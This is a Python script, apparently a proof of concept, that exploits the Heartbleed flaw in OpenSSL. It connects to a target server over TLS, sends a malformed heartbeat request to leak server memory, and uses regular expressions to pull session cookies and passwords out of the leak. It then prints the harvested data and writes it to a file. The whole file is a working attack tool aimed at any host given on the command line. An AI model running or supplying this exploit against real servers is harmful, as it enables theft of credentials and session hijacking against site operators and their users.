import sys
import struct
import socket
import time
import re

def send_heartbeat(sock):
    heartbeat_payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'
    sock.send(heartbeat_payload)
    return sock.recv(16384)  # Attempt to retrieve leaked memory

def extract_sensitive_data(leaked_data):
    # Regex patterns for common sensitive data
    session_cookie_pattern = rb'(sessionid=[a-f0-9]+)'
    password_pattern = rb'password=[^&\s]+'
    
    session_cookies = re.findall(session_cookie_pattern, leaked_data)
    passwords = re.findall(password_pattern, leaked_data)
    
    return session_cookies, passwords

def save_to_file(session_cookies, passwords):
    with open("extracted_data.txt", "w") as f:
        if session_cookies:
            f.write("Extracted Session Cookies:\n")
            for cookie in session_cookies:
                f.write(cookie.decode() + "\n")
        
        if passwords:
            f.write("\nExtracted Passwords:\n")
            for password in passwords:
                f.write(password.decode() + "\n")

def exploit_heartbleed(target, port=443):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        
        # Send ClientHello
        client_hello = bytes.fromhex(
            "16030200310100002d030255aa70b6e9460b3e0e646ee992ee"
            "bfb46e12dff8ad92bdf16384000000050010000000d000b000008"
            "6c6f63616c686f7374"
        )
        sock.send(client_hello)
        sock.recv(1024)  # ServerHello response
        
        leaked_data = send_heartbeat(sock)
        if leaked_data:
            print("[+] Possible leaked memory detected!")
            print(leaked_data[:200])  # Displaying first 200 bytes
            
            session_cookies, passwords = extract_sensitive_data(leaked_data)
            
            if session_cookies:
                print("[+] Extracted Session Cookies:")
                for cookie in session_cookies:
                    print(cookie.decode())
            
            if passwords:
                print("[+] Extracted Passwords:")
                for password in passwords:
                    print(password.decode())
            
            save_to_file(session_cookies, passwords)
            print("[+] Extracted data saved to extracted_data.txt")
        else:
            print("[-] No data leaked.")
        
        sock.close()
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python heartbleed_poc.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Testing {target} for Heartbleed...")
    exploit_heartbleed(target)
